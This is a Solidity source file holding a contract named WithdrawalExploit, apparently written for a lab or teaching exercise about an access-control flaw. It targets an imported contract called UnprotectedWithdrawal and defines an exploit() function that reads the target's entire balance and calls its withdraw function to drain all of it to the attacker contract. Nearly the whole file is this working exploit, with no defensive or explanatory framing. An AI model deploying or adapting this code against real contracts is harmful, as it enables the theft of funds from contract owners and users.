// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./UnprotectedWithdrawal.sol"; // Import the vulnerable contract

contract WithdrawalExploit {
    UnprotectedWithdrawal public targetContract;

    constructor(address _targetAddress) {
        targetContract = UnprotectedWithdrawal(payable(_targetAddress));
    }

    // Exploit the vulnerable withdraw function to drain all funds
    function exploit() external {
        uint256 contractBalance = address(targetContract).balance;
        targetContract.withdraw(contractBalance);
    }

    // Receive Ether from the target contract
    receive() external payable {}
}
